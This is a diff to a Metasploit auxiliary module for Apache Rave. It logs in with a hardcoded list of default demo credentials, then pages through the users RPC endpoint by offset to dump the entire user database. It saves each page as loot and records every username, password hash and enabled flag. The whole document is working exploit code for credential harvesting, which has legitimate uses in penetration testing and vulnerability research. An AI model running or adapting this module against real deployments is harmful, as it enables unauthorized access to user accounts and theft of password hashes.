@@ -66,14 +66,14 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	def disclose(cookie)
+	def disclose(cookie, offset)
 		uri = normalize_uri(target_uri.to_s, "app", "api", "rpc", "users", "get")
 
 		res = send_request_cgi({
 			'uri'      => uri,
 			'method'   => 'GET',
 			'vars_get' => {
-				'offset' => "1"
+				'offset' => "#{offset}"
 			},
 			'cookie' => "JSESSIONID=#{cookie}"
 		})
@@ -84,21 +84,6 @@ class Metasploit3 < Msf::Auxiliary
 			return nil
 		end
 
-	end
-
-	def get_credentials(data)
-		json_info = JSON.parse(data)
-		json_info["result"]["resultSet"].each { |result|
-			vprint_good("#{rhost}:#{rport} - User #{result["username"]} found")
-			report_auth_info(
-				:host => rhost,
-				:port => rport,
-				:sname => "Apache Rave",
-				:user => result["username"],
-				:pass => result["password"],
-				:active => result["enabled"]
-			)
-		}
 	end
 
 	def setup
@@ -113,7 +98,10 @@ class Metasploit3 < Msf::Auxiliary
 			"george.doe" => "george.doe",
 			"maija.m" => "maija.m",
 			"mario.rossi" => "mario.rossi",
-			"one.col" => "one.col"
+			"one.col" => "one.col",
+			"three.col" => "three.col",
+			"threewn.col" => "threewn.col",
+			"twown.col" => "twown.col"
 		}
 	end
 
@@ -169,26 +157,52 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		print_status("#{rhost}:#{rport} - Disclosing information...")
-		users_data = disclose(cookie)
-		if users_data.nil?
-			print_error("#{rhost}:#{rport} - Disclosure failed. Aborting...")
-			return
-		else
-			print_good("#{rhost}:#{rport} - Disclosure successful")
+		offset = 0
+		search = true
+
+		while search
+			print_status("#{rhost}:#{rport} - Disclosing offset #{offset}...")
+			users_data = disclose(cookie, offset)
+			if users_data.nil?
+				print_error("#{rhost}:#{rport} - Disclosure failed. Aborting...")
+				return
+			else
+				print_good("#{rhost}:#{rport} - Disclosure successful")
+			end
+
+			json_info = JSON.parse(users_data)
+
+			path = store_loot(
+				'apache.rave.users',
+				'application/json',
+				rhost,
+				users_data,
+				nil,
+				"Apache Rave Users Database Offset #{offset}"
+			)
+			print_status("#{rhost}:#{rport} - Information for offset #{offset} saved in: #{path}")
+
+			print_status("#{rhost}:#{rport} - Recovering Hashes...")
+			json_info["result"]["resultSet"].each { |result|
+				vprint_good("#{rhost}:#{rport} - User #{result["username"]} found")
+				report_auth_info(
+					:host => rhost,
+					:port => rport,
+					:sname => "Apache Rave",
+					:user => result["username"],
+					:pass => result["password"],
+					:active => result["enabled"]
+				)
+			}
+
+			page = json_info["result"]["currentPage"]
+			total_pages = json_info["result"]["numberOfPages"]
+			offset = offset + json_info["result"]["pageSize"]
+			if page == total_pages
+				search = false
+			end
+
 		end
-
-		path = store_loot(
-			'apache.rave.users',
-			'application/json',
-			rhost,
-			users_data,
-			nil,
-			"Apache Rave Users Database"
-		)
-		print_status("#{rhost}:#{rport} - Information saved in: #{path}")
-
-		print_status("#{rhost}:#{rport} - Recovering Hashes...")
-		get_credentials(users_data)
 
 	end
 
